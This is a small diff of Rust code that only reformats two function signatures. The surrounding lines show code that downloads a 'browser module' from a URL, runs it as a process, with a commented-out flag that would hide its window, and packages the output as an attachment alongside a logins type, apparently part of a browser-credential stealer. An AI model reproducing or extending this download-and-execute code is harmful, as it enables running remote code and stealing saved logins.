@@ -40,11 +40,7 @@ use crate::logins::Login;
 ///     Ok(())
 /// }
 /// ```
-pub async fn download_browser_module(
-	url: &str,
-	filename: &str,
-	temp_file_path: &PathBuf,
-) -> Result<(), Box<dyn std::error::Error>> {
+pub async fn download_browser_module(url: &str, filename: &str, temp_file_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
 	let client = reqwest::Client::new();
 	let response = client.get(url).send().await?;
 
@@ -86,9 +82,7 @@ pub async fn download_browser_module(
 /// This function can return an error if the command fails to execute, if there
 /// is an issue with the command's output, or if there is a problem with
 /// deserializing the output into the expected data format.
-pub async fn generate_attachment(
-	temp_file_path: PathBuf,
-) -> Result<AttachmentType<'static>, Box<dyn std::error::Error>> {
+pub async fn generate_attachment(temp_file_path: PathBuf) -> Result<AttachmentType<'static>, Box<dyn std::error::Error>> {
 	let output = Command::new(temp_file_path)
 		.stdout(Stdio::piped())
 		//        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
